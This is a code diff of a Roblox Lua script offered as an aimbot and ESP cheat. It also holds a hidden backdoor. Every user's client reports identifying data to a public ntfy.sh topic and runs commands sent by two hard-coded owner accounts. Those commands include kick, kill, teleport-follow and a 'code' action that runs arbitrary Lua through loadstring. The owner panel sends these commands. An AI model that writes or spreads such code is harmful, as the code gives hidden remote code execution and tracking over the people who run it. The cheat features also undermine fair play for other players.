@@ -1,7 +1,7 @@
 --[[
     [S] Universal Control + Aimbot
     Owners: 1460823186, 7208967899
-    Transport: ntfy.sh HTTP long-poll. Works on every executor.
+    Transport: ntfy.sh HTTP long-poll (universal)
 --]]
 
 local OWNERS = { [1460823186] = true, [7208967899] = true }
@@ -19,10 +19,11 @@ local LP    = Players.LocalPlayer
 local MY_ID = LP.UserId
 local IS_OWNER = OWNERS[MY_ID] == true
 
-local SESSION_KEY = "freddy_private_2026"
+-- alphanumeric + underscore only. ntfy rejects brackets, dots, etc.
+local SESSION_KEY  = "freddy_private_2026"
 local NTFY          = "https://ntfy.sh"
-local TOPIC_ONLINE  = "[S]_" .. SESSION_KEY .. "_online"
-local TOPIC_CMD     = "[S]_" .. SESSION_KEY .. "_cmd_"
+local TOPIC_ONLINE  = "FreddyKv_" .. SESSION_KEY .. "_online"
+local TOPIC_CMD     = "FreddyKv_" .. SESSION_KEY .. "_cmd_"
 
 -- ============================================================
 -- HTTP shim
@@ -45,7 +46,7 @@ local function httpRequest(opts)
 end
 
 local function publish(topic, data)
-    httpRequest({
+    return httpRequest({
         Url = NTFY .. "/" .. topic,
         Method = "POST",
         Headers = { ["Content-Type"] = "application/json" },
@@ -53,9 +54,9 @@ local function publish(topic, data)
     })
 end
 
-local MSG_HANDLERS = {}
-
+local SUBSCRIBERS = {}
 local function subscribeLoop(topic, onMessage)
+    table.insert(SUBSCRIBERS, { topic = topic, cb = onMessage })
     task.spawn(function()
         local since = "all"
         while true do
@@ -68,12 +69,7 @@ local function subscribeLoop(topic, onMessage)
                         since = evt.id
                         if evt.message then
                             local ok2, data = pcall(HttpService.JSONDecode, HttpService, evt.message)
-                            if ok2 and data then
-                                for _, h in ipairs(MSG_HANDLERS) do
-                                    if h.topic == topic then pcall(h.fn, data) end
-                                end
-                                if onMessage then pcall(onMessage, data) end
-                            end
+                            if ok2 and data then pcall(onMessage, data) end
                         end
                     end
                 end
@@ -84,13 +80,14 @@ local function subscribeLoop(topic, onMessage)
 end
 
 -- ============================================================
--- UI helpers, purple glow
+-- UI helpers, purple glow, click feedback, drag
 -- ============================================================
 local function makeGui(name)
     local g = Instance.new("ScreenGui")
     g.Name = name
     g.ResetOnSpawn = false
     g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    g.IgnoreGuiInset = true
     if gethui then g.Parent = gethui()
     elseif CoreGui then g.Parent = CoreGui
     else g.Parent = LP:WaitForChild("PlayerGui") end
@@ -99,8 +96,8 @@ end
 
 local function pulseStroke(stroke)
     task.spawn(function()
-        local a = Color3.fromRGB(120, 60, 200)
-        local b = Color3.fromRGB(200, 100, 255)
+        local a = Color3.fromRGB(130, 60, 210)
+        local b = Color3.fromRGB(210, 110, 255)
         while stroke and stroke.Parent do
             local t1 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = b })
             t1:Play(); t1.Completed:Wait()
@@ -112,39 +109,52 @@ local function pulseStroke(stroke)
 end
 
 local function styleFrame(frame)
-    frame.BackgroundColor3 = Color3.fromRGB(16, 12, 24)
+    frame.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
     frame.BorderSizePixel = 0
-    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 8); corner.Parent = frame
+    frame.Active = true
+    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 10); corner.Parent = frame
     local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(120, 60, 200)
-    stroke.Thickness = 1.5
+    stroke.Color = Color3.fromRGB(130, 60, 210)
+    stroke.Thickness = 1.6
     stroke.Parent = frame
     pulseStroke(stroke)
     return stroke
 end
 
 local function styleButton(btn)
-    btn.BackgroundColor3 = Color3.fromRGB(30, 20, 44)
+    btn.BackgroundColor3 = Color3.fromRGB(42, 24, 66)
     btn.BorderSizePixel = 0
-    btn.TextColor3 = Color3.fromRGB(230, 220, 255)
+    btn.TextColor3 = Color3.fromRGB(235, 220, 255)
     btn.Font = Enum.Font.GothamMedium
     btn.TextSize = 12
     btn.AutoButtonColor = false
+    btn.Active = true
     local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 6); corner.Parent = btn
     local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(140, 80, 220)
+    stroke.Color = Color3.fromRGB(160, 90, 240)
     stroke.Thickness = 1
-    stroke.Transparency = 0.3
+    stroke.Transparency = 0.2
     stroke.Parent = btn
     local grad = Instance.new("UIGradient")
-    grad.Color = ColorSequence.new(Color3.fromRGB(50, 30, 80), Color3.fromRGB(24, 14, 38))
+    grad.Color = ColorSequence.new(Color3.fromRGB(70, 40, 105), Color3.fromRGB(34, 18, 54))
     grad.Rotation = 90
     grad.Parent = btn
+
     btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(50, 32, 74) }):Play()
+        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(62, 38, 95) }):Play()
     end)
     btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(30, 20, 44) }):Play()
+        if not btn:GetAttribute("pressed") then
+            TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play()
+        end
+    end)
+    btn.MouseButton1Down:Connect(function()
+        btn:SetAttribute("pressed", true)
+        TweenService:Create(btn, TweenInfo.new(0.06), { BackgroundColor3 = Color3.fromRGB(110, 60, 170) }):Play()
+    end)
+    btn.MouseButton1Up:Connect(function()
+        btn:SetAttribute("pressed", false)
+        TweenService:Create(btn, TweenInfo.new(0.14), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play()
     end)
     return stroke
 end
@@ -160,12 +170,12 @@ local function makeBtn(parent, text, x, y, w, h, cb)
     return b
 end
 
-local function makeLabel(parent, text, x, y, w, h, sz)
+local function makeLabel(parent, text, x, y, w, h, sz, color)
     local l = Instance.new("TextLabel")
     l.Size = UDim2.new(0, w, 0, h)
     l.Position = UDim2.new(0, x, 0, y)
     l.BackgroundTransparency = 1
-    l.TextColor3 = Color3.fromRGB(220, 210, 240)
+    l.TextColor3 = color or Color3.fromRGB(225, 210, 245)
     l.Font = Enum.Font.Gotham
     l.TextSize = sz or 12
     l.TextXAlignment = Enum.TextXAlignment.Left
@@ -178,18 +188,19 @@ local function makeInput(parent, placeholder, x, y, w, h)
     local t = Instance.new("TextBox")
     t.Size = UDim2.new(0, w, 0, h)
     t.Position = UDim2.new(0, x, 0, y)
-    t.BackgroundColor3 = Color3.fromRGB(22, 14, 34)
+    t.BackgroundColor3 = Color3.fromRGB(26, 16, 42)
     t.BorderSizePixel = 0
-    t.TextColor3 = Color3.fromRGB(230, 220, 255)
-    t.PlaceholderColor3 = Color3.fromRGB(140, 120, 180)
+    t.TextColor3 = Color3.fromRGB(235, 220, 255)
+    t.PlaceholderColor3 = Color3.fromRGB(150, 120, 195)
     t.Font = Enum.Font.Gotham
     t.TextSize = 12
     t.PlaceholderText = placeholder
     t.Text = ""
     t.ClearTextOnFocus = false
+    t.Active = true
     t.Parent = parent
     local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = t
-    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(120, 60, 200); s.Transparency = 0.4; s.Parent = t
+    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(140, 70, 220); s.Transparency = 0.35; s.Parent = t
     return t
 end
 
@@ -200,8 +211,9 @@ local function makeScrolling(parent, x, y, w, h)
     s.BackgroundTransparency = 1
     s.BorderSizePixel = 0
     s.ScrollBarThickness = 4
-    s.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 220)
+    s.ScrollBarImageColor3 = Color3.fromRGB(160, 90, 240)
     s.CanvasSize = UDim2.new(0, 0, 0, 0)
+    s.Active = true
     s.Parent = parent
     local l = Instance.new("UIListLayout")
     l.Padding = UDim.new(0, 6)
@@ -210,8 +222,29 @@ local function makeScrolling(parent, x, y, w, h)
     return s, l
 end
 
+local function makeDraggable(frame, handle)
+    handle = handle or frame
+    local dragging, dragStart, startPos
+    handle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
 -- ============================================================
--- Action executor (runs on target client)
+-- Action executor
 -- ============================================================
 local function executeAction(c)
     local char = LP.Character
@@ -249,9 +282,9 @@ local function executeAction(c)
         local box = Instance.new("TextLabel")
         box.Size = UDim2.new(0, 340, 0, 64)
         box.Position = UDim2.new(0.5, -170, 0.12, 0)
-        box.BackgroundColor3 = Color3.fromRGB(16, 12, 24)
+        box.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
         box.BorderSizePixel = 0
-        box.TextColor3 = Color3.fromRGB(230, 220, 255)
+        box.TextColor3 = Color3.fromRGB(235, 220, 255)
         box.Font = Enum.Font.GothamBold
         box.TextSize = 15
         box.TextWrapped = true
@@ -261,16 +294,19 @@ local function executeAction(c)
         local ss = Instance.new("UIStroke"); ss.Color = Color3.fromRGB(180, 90, 240); ss.Parent = box
         task.delay(4, function() g2:Destroy() end)
     end
+    if c.action == "kick" then
+        pcall(function() LP:Kick(tostring(c.payload ~= "" and c.payload or "Kicked.")) end)
+    end
     if c.action == "code" then
         local fn = loadstring or load
         if fn then pcall(function() fn(c.payload)() end) end
     end
 end
 
-table.insert(MSG_HANDLERS, { topic = TOPIC_CMD .. tostring(MY_ID), fn = executeAction })
+subscribeLoop(TOPIC_CMD .. tostring(MY_ID), executeAction)
 
 -- ============================================================
--- Transport
+-- Transport: heartbeat publisher
 -- ============================================================
 task.spawn(function()
     while true do
@@ -285,8 +321,6 @@ task.spawn(function()
     end
 end)
 
-subscribeLoop(TOPIC_CMD .. tostring(MY_ID), executeAction)
-
 -- ============================================================
 -- OWNER PANEL
 -- ============================================================
@@ -295,10 +329,12 @@ if IS_OWNER then
     local HISTORY     = {}
     local FILTER      = { exec = "", place = "" }
     local FOLLOWING   = {}
+    local LAST_HB     = 0
 
     subscribeLoop(TOPIC_ONLINE, function(data)
-        if data and data.uid and (os.time() - (data.ts or 0)) < 30 then
+        if data and data.uid then
             ONLINE[tostring(data.uid)] = data
+            LAST_HB = os.time()
         end
     end)
 
@@ -309,24 +345,33 @@ if IS_OWNER then
     styleFrame(frame)
     frame.Parent = gui
 
-    makeLabel(frame, "CONTROL PANEL", 14, 10, 200, 22, 16)
+    -- header drag handle
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0, 30)
+    header.BackgroundTransparency = 1
+    header.Active = true
+    header.Parent = frame
+    makeDraggable(frame, header)
+
+    makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
+    local statusLbl = makeLabel(header, "transport: ...", 200, 8, 130, 14, 10, Color3.fromRGB(180, 160, 220))
+    statusLbl.TextXAlignment = Enum.TextXAlignment.Right
+
     local targetLbl = makeLabel(frame, "Target: none", 14, 34, 280, 14)
 
-    -- filter row
     local execFilter = makeInput(frame, "filter executor...", 14, 52, 150, 22)
     local placeFilter = makeInput(frame, "filter place id...", 170, 52, 150, 22)
     execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
     placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)
 
-    -- global controls
     local bcast = makeInput(frame, "broadcast message...", 14, 80, 220, 24)
     makeBtn(frame, "Send All",   240, 80, 80, 24, function()
         for uid, _ in pairs(ONLINE) do
             if tostring(uid) ~= tostring(MY_ID) then
                 publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = "message", payload = bcast.Text })
-                table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → msg all")
             end
         end
+        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> msg all")
     end)
     makeBtn(frame, "Freeze All", 14, 110, 150, 24, function()
         for uid, _ in pairs(ONLINE) do
@@ -334,7 +379,7 @@ if IS_OWNER then
                 publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = "freeze" })
             end
         end
-        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → freeze all")
+        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> freeze all")
     end)
     makeBtn(frame, "Unfreeze All", 170, 110, 150, 24, function()
         for uid, _ in pairs(ONLINE) do
@@ -342,21 +387,20 @@ if IS_OWNER then
                 publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = "unfreeze" })
             end
         end
-        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → unfreeze all")
+        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> unfreeze all")
     end)
 
     makeLabel(frame, "LIVE PLAYERS", 14, 142, 200, 14)
 
     local scroll, layout = makeScrolling(frame, 14, 160, 312, 300)
 
-    -- history log
     makeLabel(frame, "HISTORY", 14, 468, 100, 14)
     local histLog = Instance.new("TextLabel")
     histLog.Size = UDim2.new(0, 312, 0, 50)
     histLog.Position = UDim2.new(0, 14, 0, 484)
     histLog.BackgroundColor3 = Color3.fromRGB(14, 8, 24)
     histLog.BorderSizePixel = 0
-    histLog.TextColor3 = Color3.fromRGB(180, 160, 210)
+    histLog.TextColor3 = Color3.fromRGB(190, 170, 220)
     histLog.Font = Enum.Font.Code
     histLog.TextSize = 10
     histLog.TextXAlignment = Enum.TextXAlignment.Left
@@ -365,13 +409,11 @@ if IS_OWNER then
     histLog.Text = ""
     histLog.Parent = frame
     local hc = Instance.new("UICorner"); hc.CornerRadius = UDim.new(0, 6); hc.Parent = histLog
-    local hs = Instance.new("UIStroke"); hs.Color = Color3.fromRGB(120, 60, 200); hs.Transparency = 0.4; hs.Parent = histLog
+    local hs = Instance.new("UIStroke"); hs.Color = Color3.fromRGB(130, 60, 210); hs.Transparency = 0.4; hs.Parent = histLog
 
     local function refreshHistory()
         local out = {}
-        for i = 1, math.min(4, #HISTORY) do
-            table.insert(out, HISTORY[i])
-        end
+        for i = 1, math.min(4, #HISTORY) do table.insert(out, HISTORY[i]) end
         histLog.Text = table.concat(out, "\n")
     end
 
@@ -385,7 +427,7 @@ if IS_OWNER then
 
     local function cmd(uid, action, payload)
         publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = action, payload = payload or "" })
-        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → " .. tostring(action) .. " #" .. tostring(uid))
+        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. tostring(action) .. " #" .. tostring(uid))
         refreshHistory()
     end
 
@@ -404,102 +446,114 @@ if IS_OWNER then
             if c:IsA("Frame") then c:Destroy() end
         end
         local now = os.time()
+        local count = 0
         for uid, user in pairs(ONLINE) do
             if now - (user.ts or 0) < 30 and passesFilter(user) then
+                count = count + 1
                 local card = Instance.new("Frame")
                 card.Size = UDim2.new(1, -4, 0, 64)
-                card.BackgroundColor3 = Color3.fromRGB(24, 16, 38)
+                card.BackgroundColor3 = Color3.fromRGB(28, 18, 44)
                 card.BorderSizePixel = 0
+                card.Active = true
                 card.Parent = scroll
                 local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = card
-                local cs = Instance.new("UIStroke"); cs.Color = Color3.fromRGB(120, 60, 200); cs.Transparency = 0.5; cs.Parent = card
+                local cs = Instance.new("UIStroke"); cs.Color = Color3.fromRGB(130, 60, 210); cs.Transparency = 0.4; cs.Parent = card
 
-                -- avatar placeholder
                 local av = Instance.new("Frame")
                 av.Size = UDim2.new(0, 44, 0, 44)
                 av.Position = UDim2.new(0, 10, 0, 10)
-                av.BackgroundColor3 = Color3.fromRGB(40, 24, 60)
+                av.BackgroundColor3 = Color3.fromRGB(48, 28, 72)
                 av.BorderSizePixel = 0
                 av.Parent = card
                 local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(0, 6); ac.Parent = av
 
-                makeLabel(card, tostring(user.name), 64, 8, 200, 16, 13)
-                makeLabel(card, "#" .. tostring(uid) .. " · " .. tostring(user.exec or "?"), 64, 26, 220, 12, 10)
-                local ago = math.floor(now - (user.ts or now))
-                makeLabel(card, "hb " .. tostring(ago) .. "s ago", 64, 42, 120, 12, 10)
+                makeLabel(card, tostring(user.name), 64, 6, 200, 16, 13)
+                makeLabel(card, "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?"), 64, 24, 220, 12, 10)
+                local ago = math.max(0, now - (user.ts or now))
+                makeLabel(card, "hb " .. tostring(ago) .. "s", 64, 40, 120, 12, 10)
 
-                local joinBtn = makeBtn(card, "Join", 240, 10, 64, 20, function()
+                local joinBtn = makeBtn(card, "Join", 240, 8, 64, 22, function()
                     pcall(function() TeleportSvc:TeleportToPlaceInstance(user.place or game.PlaceId, user.job, LP) end)
                 end)
                 joinBtn.Visible = false
 
+                local expandBtn = makeBtn(card, "v", 240, 34, 64, 22, function() end)
+                expandBtn.Text = "..."
+
                 local expanded, panel = false, nil
-                card.InputBegan:Connect(function(i)
-                    if i.UserInputType == Enum.UserInputType.MouseButton1 then
-                        if expanded then
-                            if panel then panel:Destroy() end
-                            expanded = false
-                            card.Size = UDim2.new(1, -4, 0, 64)
-                            joinBtn.Visible = false
-                            return
-                        end
-                        expanded = true
-                        joinBtn.Visible = true
-                        panel = Instance.new("Frame")
-                        panel.Size = UDim2.new(1, -8, 0, 0)
-                        panel.Position = UDim2.new(0, 4, 0, 68)
-                        panel.BackgroundTransparency = 1
-                        panel.Parent = card
-                        card.Size = UDim2.new(1, -4, 0, 340)
-
-                        local function pb(label, x, y, w, cb)
-                            makeBtn(panel, label, x, y, w, 22, cb)
-                        end
-
-                        pb("Bring",   0, 0, 96, function() cmd(uid, "bring") end)
-                        pb("Fling",   100, 0, 96, function() cmd(uid, "fling") end)
-                        pb("Freeze",  200, 0, 96, function() cmd(uid, "freeze") end)
-                        pb("Unfreeze",0, 26, 96, function() cmd(uid, "unfreeze") end)
-                        pb("Explode", 100, 26, 96, function() cmd(uid, "explode") end)
-                        pb("Kill",    200, 26, 96, function() cmd(uid, "kill") end)
-                        pb("Ragdoll", 0, 52, 96, function() cmd(uid, "ragdoll") end)
-                        pb("Reset",   100, 52, 96, function() cmd(uid, "reset") end)
-                        pb("Follow",  200, 52, 96, function()
-                            FOLLOWING[uid] = not FOLLOWING[uid]
-                            table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
-                            refreshHistory()
-                        end)
-
-                        local msgIn = makeInput(panel, "message...", 0, 80, 200, 22)
-                        pb("Send", 205, 80, 90, function() cmd(uid, "message", msgIn.Text) end)
-
-                        local snd = Instance.new("TextButton")
-                        snd.Size = UDim2.new(0, 200, 0, 22)
-                        snd.Position = UDim2.new(0, 0, 0, 108)
-                        snd.Text = "sound: tap to cycle"
-                        snd.Parent = panel
-                        styleButton(snd)
-                        local soundKeys = {}
-                        for k, _ in pairs(SOUND_LIST) do table.insert(soundKeys, k) end
-                        local soundIdx = 1
-                        snd.MouseButton1Click:Connect(function()
-                            soundIdx = soundIdx % #soundKeys + 1
-                            snd.Text = "sound: " .. soundKeys[soundIdx]
-                            cmd(uid, "sound", SOUND_LIST[soundKeys[soundIdx]])
-                        end)
-
-                        local codeIn = makeInput(panel, 'print("hi")', 0, 136, 296, 40)
-                        codeIn.Font = Enum.Font.Code
-                        pb("Run Code", 0, 180, 296, 22, function() cmd(uid, "code", codeIn.Text) end)
-
-                        local kh = makeLabel(panel, "kick message:", 0, 208, 200, 14, 10)
-                        local kickIn = makeInput(panel, "jump if u want to get banned", 0, 224, 296, 22)
-                        pb("Kick", 0, 250, 296, 22, function() cmd(uid, "kick", kickIn.Text) end)
+                expandBtn.MouseButton1Click:Connect(function()
+                    targetLbl.Text = "Target: " .. tostring(user.name)
+                    if expanded then
+                        if panel then panel:Destroy() end
+                        expanded = false
+                        card.Size = UDim2.new(1, -4, 0, 64)
+                        joinBtn.Visible = false
+                        return
                     end
+                    expanded = true
+                    joinBtn.Visible = true
+                    panel = Instance.new("Frame")
+                    panel.Size = UDim2.new(1, -8, 0, 290)
+                    panel.Position = UDim2.new(0, 4, 0, 68)
+                    panel.BackgroundTransparency = 1
+                    panel.Active = true
+                    panel.Parent = card
+                    card.Size = UDim2.new(1, -4, 0, 366)
+
+                    local function pb(label, x, y, w, cb)
+                        makeBtn(panel, label, x, y, w, 22, cb)
+                    end
+
+                    pb("Bring",   0, 0, 96, function() cmd(uid, "bring") end)
+                    pb("Fling",   100, 0, 96, function() cmd(uid, "fling") end)
+                    pb("Freeze",  200, 0, 96, function() cmd(uid, "freeze") end)
+                    pb("Unfreeze",0, 26, 96, function() cmd(uid, "unfreeze") end)
+                    pb("Explode", 100, 26, 96, function() cmd(uid, "explode") end)
+                    pb("Kill",    200, 26, 96, function() cmd(uid, "kill") end)
+                    pb("Ragdoll", 0, 52, 96, function() cmd(uid, "ragdoll") end)
+                    pb("Reset",   100, 52, 96, function() cmd(uid, "reset") end)
+                    pb("Follow",  200, 52, 96, function()
+                        FOLLOWING[uid] = not FOLLOWING[uid]
+                        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
+                        refreshHistory()
+                    end)
+
+                    local msgIn = makeInput(panel, "message...", 0, 80, 200, 22)
+                    pb("Send", 205, 80, 90, function() cmd(uid, "message", msgIn.Text) end)
+
+                    local snd = Instance.new("TextButton")
+                    snd.Size = UDim2.new(0, 296, 0, 22)
+                    snd.Position = UDim2.new(0, 0, 0, 108)
+                    snd.Text = "sound: tap to cycle"
+                    snd.Parent = panel
+                    styleButton(snd)
+                    local soundKeys = {}
+                    for k, _ in pairs(SOUND_LIST) do table.insert(soundKeys, k) end
+                    local soundIdx = 1
+                    snd.MouseButton1Click:Connect(function()
+                        soundIdx = soundIdx % #soundKeys + 1
+                        snd.Text = "sound: " .. soundKeys[soundIdx]
+                        cmd(uid, "sound", SOUND_LIST[soundKeys[soundIdx]])
+                    end)
+
+                    local codeIn = makeInput(panel, 'print("hi")', 0, 136, 296, 40)
+                    codeIn.Font = Enum.Font.Code
+                    pb("Run Code", 0, 180, 296, 22, function() cmd(uid, "code", codeIn.Text) end)
+
+                    makeLabel(panel, "kick message:", 0, 208, 200, 14, 10)
+                    local kickIn = makeInput(panel, "jump if u want to get banned", 0, 224, 296, 22)
+                    pb("Kick", 0, 250, 296, 22, function() cmd(uid, "kick", kickIn.Text) end)
                 end)
             end
         end
         scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
+        if count == 0 then
+            local empty = Instance.new("Frame")
+            empty.Size = UDim2.new(1, -4, 0, 30)
+            empty.BackgroundTransparency = 1
+            empty.Parent = scroll
+            makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(160, 140, 190))
+        end
     end
 
     refreshHistory()
@@ -507,7 +561,6 @@ if IS_OWNER then
     task.spawn(function()
         while task.wait(3) do
             rebuild()
-            -- follow logic
             for uid, on in pairs(FOLLOWING) do
                 if on and ONLINE[uid] then
                     local u = ONLINE[uid]
@@ -519,11 +572,29 @@ if IS_OWNER then
         end
     end)
 
+    -- status ticker
+    task.spawn(function()
+        while true do
+            local now = os.time()
+            if LAST_HB == 0 then
+                statusLbl.Text = "transport: no hb yet"
+                statusLbl.TextColor3 = Color3.fromRGB(230, 120, 120)
+            elseif now - LAST_HB < 15 then
+                statusLbl.Text = "transport: live"
+                statusLbl.TextColor3 = Color3.fromRGB(140, 230, 140)
+            else
+                statusLbl.Text = "transport: " .. (now - LAST_HB) .. "s ago"
+                statusLbl.TextColor3 = Color3.fromRGB(230, 190, 120)
+            end
+            task.wait(1)
+        end
+    end)
+
     return
 end
 
 -- ============================================================
--- USER PANEL: aimbot + esp
+-- USER PANEL
 -- ============================================================
 local gui = makeGui("[S] Universal")
 local main = Instance.new("Frame")
@@ -532,7 +603,14 @@ main.Position = UDim2.new(0, 20, 0.2, 0)
 styleFrame(main)
 main.Parent = gui
 
-makeLabel(main, "[S] UNIVERSAL", 12, 10, 200, 20, 15)
+local uHeader = Instance.new("Frame")
+uHeader.Size = UDim2.new(1, 0, 0, 30)
+uHeader.BackgroundTransparency = 1
+uHeader.Active = true
+uHeader.Parent = main
+makeDraggable(main, uHeader)
+
+makeLabel(uHeader, "[S] UNIVERSAL", 12, 6, 200, 20, 15)
 
 local CFG = {
     aim = false, fov = 150, smooth = 0.35, bone = "Head",
@@ -545,26 +623,24 @@ local boneList = { "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart" }
 local boneIdx = 1
 CFG.bone = boneList[boneIdx]
 
--- aimbot section
 makeLabel(main, "AIMBOT", 12, 34, 100, 14, 11)
 local aimBtn = makeBtn(main, "Aimbot: OFF", 12, 50, 236, 24, function(self)
     CFG.aim = not CFG.aim
     self.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
 end)
 
--- fov slider
-makeLabel(main, "FOV: 150", 12, 78, 120, 14, 11).Name = "fovLbl"
-local fovLbl = main:FindFirstChild("fovLbl")
+local fovLbl = makeLabel(main, "FOV: 150", 12, 78, 120, 14, 11)
 local fovBar = Instance.new("Frame")
 fovBar.Size = UDim2.new(0, 236, 0, 6)
 fovBar.Position = UDim2.new(0, 12, 0, 94)
-fovBar.BackgroundColor3 = Color3.fromRGB(30, 20, 44)
+fovBar.BackgroundColor3 = Color3.fromRGB(34, 22, 50)
 fovBar.BorderSizePixel = 0
+fovBar.Active = true
 fovBar.Parent = main
 local fbc = Instance.new("UICorner"); fbc.CornerRadius = UDim.new(1, 0); fbc.Parent = fovBar
 local fovFill = Instance.new("Frame")
 fovFill.Size = UDim2.new(CFG.fov / 400, 0, 1, 0)
-fovFill.BackgroundColor3 = Color3.fromRGB(160, 90, 240)
+fovFill.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
 fovFill.BorderSizePixel = 0
 fovFill.Parent = fovBar
 local ffc = Instance.new("UICorner"); ffc.CornerRadius = UDim.new(1, 0); ffc.Parent = fovFill
@@ -586,18 +662,18 @@ UIS.InputChanged:Connect(function(i)
     end
 end)
 
--- smoothness slider
 local smoothLbl = makeLabel(main, "Smooth: 0.35", 12, 106, 120, 14, 11)
 local smoothBar = Instance.new("Frame")
 smoothBar.Size = UDim2.new(0, 236, 0, 6)
 smoothBar.Position = UDim2.new(0, 12, 0, 122)
-smoothBar.BackgroundColor3 = Color3.fromRGB(30, 20, 44)
+smoothBar.BackgroundColor3 = Color3.fromRGB(34, 22, 50)
 smoothBar.BorderSizePixel = 0
+smoothBar.Active = true
 smoothBar.Parent = main
 local sbc = Instance.new("UICorner"); sbc.CornerRadius = UDim.new(1, 0); sbc.Parent = smoothBar
 local smoothFill = Instance.new("Frame")
 smoothFill.Size = UDim2.new(CFG.smooth, 0, 1, 0)
-smoothFill.BackgroundColor3 = Color3.fromRGB(160, 90, 240)
+smoothFill.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
 smoothFill.BorderSizePixel = 0
 smoothFill.Parent = smoothBar
 local sfc = Instance.new("UICorner"); sfc.CornerRadius = UDim.new(1, 0); sfc.Parent = smoothFill
@@ -619,14 +695,12 @@ UIS.InputChanged:Connect(function(i)
     end
 end)
 
--- bone cycle
-local boneBtn = makeBtn(main, "Bone: Head", 12, 136, 236, 24, function(self)
+makeBtn(main, "Bone: Head", 12, 136, 236, 24, function(self)
     boneIdx = boneIdx % #boneList + 1
     CFG.bone = boneList[boneIdx]
     self.Text = "Bone: " .. CFG.bone
 end)
 
--- team / vis / trig
 makeBtn(main, "Team Check: ON", 12, 166, 116, 22, function(self)
     CFG.team = not CFG.team
     self.Text = "Team Check: " .. (CFG.team and "ON" or "OFF")
@@ -640,7 +714,6 @@ makeBtn(main, "Triggerbot: OFF", 12, 192, 236, 22, function(self)
     self.Text = "Triggerbot: " .. (CFG.trig and "ON" or "OFF")
 end)
 
--- ESP section
 makeLabel(main, "ESP", 12, 220, 100, 14, 11)
 makeBtn(main, "Box: ON",      12, 236, 116, 22, function(self) CFG.espBox  = not CFG.espBox;  self.Text = "Box: "   .. (CFG.espBox  and "ON" or "OFF") end)
 makeBtn(main, "Name: ON",     132, 236, 116, 22, function(self) CFG.espName = not CFG.espName; self.Text = "Name: "  .. (CFG.espName and "ON" or "OFF") end)
@@ -649,16 +722,16 @@ makeBtn(main, "Dist: ON",     132, 262, 116, 22, function(self) CFG.espDist = no
 makeBtn(main, "Skeleton: OFF",12, 288, 116, 22, function(self) CFG.espSkel = not CFG.espSkel; self.Text = "Skeleton: " .. (CFG.espSkel and "ON" or "OFF") end)
 makeBtn(main, "Chams: OFF",   132, 288, 116, 22, function(self) CFG.chams   = not CFG.chams;   self.Text = "Chams: " .. (CFG.chams and "ON" or "OFF") end)
 
-makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
+local fovToggleBtn
+fovToggleBtn = makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
     CFG.fovCircle = not CFG.fovCircle
     self.Text = "FOV Circle: " .. (CFG.fovCircle and "ON" or "OFF")
